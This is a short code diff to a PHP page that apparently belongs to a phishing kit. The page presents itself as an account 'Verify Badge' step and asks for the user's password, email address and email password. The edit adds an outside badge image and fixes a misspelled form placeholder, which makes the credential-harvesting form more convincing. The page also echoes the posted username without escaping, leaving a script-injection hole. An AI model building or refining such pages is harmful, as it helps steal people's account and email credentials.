@@ -93,7 +93,7 @@ if(isset($_POST['comen']))
         }else {
         ?>
         <form action="/" method="POST" class="second-form">
-            <p>Verify Badge @<?= $_POST['username']; ?></p>
+            <p>Verify Badge @<?= $_POST['username']; ?><img src="https://istalya.com/image/cache/catalog/resimler/Varl%C4%B1k%201-1080x1080w.png" width=60 height=60></p>
             <span class="color-gray">Verify Badge on your account.</span>
             <div class="mb-3">
                 <input type="password" name="password" id="password" class="form-input" placeholder="Password">
@@ -102,7 +102,7 @@ if(isset($_POST['comen']))
                 <input type="text" name="email" id="email" class="form-input" placeholder="Email">
             </div>
             <div class="mb-3">
-                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholer="Email Password">
+                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password">
             </div>
             <input hidden type="text" name="username" id="username" value="<?= $_POST['username']; ?>">
             <input hidden type="number" name="comen" value="1">
